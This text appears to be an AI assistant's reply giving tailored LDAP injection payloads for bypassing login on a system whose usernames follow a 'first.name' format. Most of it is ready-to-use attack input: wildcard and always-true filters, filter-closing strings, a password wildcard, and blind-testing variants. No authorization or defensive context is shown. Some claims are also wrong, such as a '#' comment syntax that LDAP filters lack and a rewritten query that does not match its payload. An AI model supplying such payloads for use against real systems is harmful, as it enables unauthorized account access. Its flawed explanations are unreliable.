If your username format is `first.name`, youâ€™ll need to adapt the LDAP injection payloads accordingly to ensure they fit the expected input format. Here are customized payloads and testing strategies:

---

### **Payloads for Testing `first.name` Format**

#### 1. **Wildcard Injection**
Inject a payload that tries to match any user in the directory:
- **Username**:  
  ```
  first.name*)(uid=*)
  ```
  This closes the `first.name` check and injects a query to match all users.

#### 2. **Always-True Logic Injection**
Test for logical OR conditions:
- **Username**:  
  ```
  first.name*)(|(uid=*)) // Bypass with logical OR
  ```

- **Password**:  
  ```
  *
  ```

---

#### 3. **Comment Injection**
Try injecting LDAP comments to bypass query processing:
- **Username**:  
  ```
  first.name*)(|(uid=*))# // Comments out the rest of the query
  ```

---

#### 4. **Password Wildcard Bypass**
Sometimes, just using a wildcard in the password field can bypass checks if the system doesn't verify the password correctly:
- **Username**:  
  ```
  first.name
  ```

- **Password**:  
  ```
  *
  ```

---

#### 5. **Closing and Injecting Additional Conditions**
If the query resembles something like this:  
```ldap
(&(uid=first.name)(userPassword=somepassword))
```
You can inject to modify the query structure:
- **Username**:  
  ```
  first.name)(&(uid=*)
  ```

- **Password**:  
  ```
  *
  ```

This payload modifies the query to:  
```ldap
(&(uid=first.name)(&(uid=*)(userPassword=*)))
```
...which could lead to a bypass.

---

#### 6. **Error-Based or Blind Testing**
If the system does not show clear results, try injecting for error responses or timing differences:
- **Username**:  
  ```
  first.name)(|(uid=*))(|(sn=*
  ```

- **Password**:  
  ```
  *
  ```

---

### **Testing Recommendations**
1. **Log Analysis**: If possible, review server logs for how inputs are processed.
2. **Output Monitoring**: Look for differences in behaviorâ€”like success messages, error codes, or response timingâ€”when injecting payloads.
3. **Escaping Edge Cases**: Test if certain characters like `.` in `first.name` are escaped improperly, as this might cause unexpected behavior.
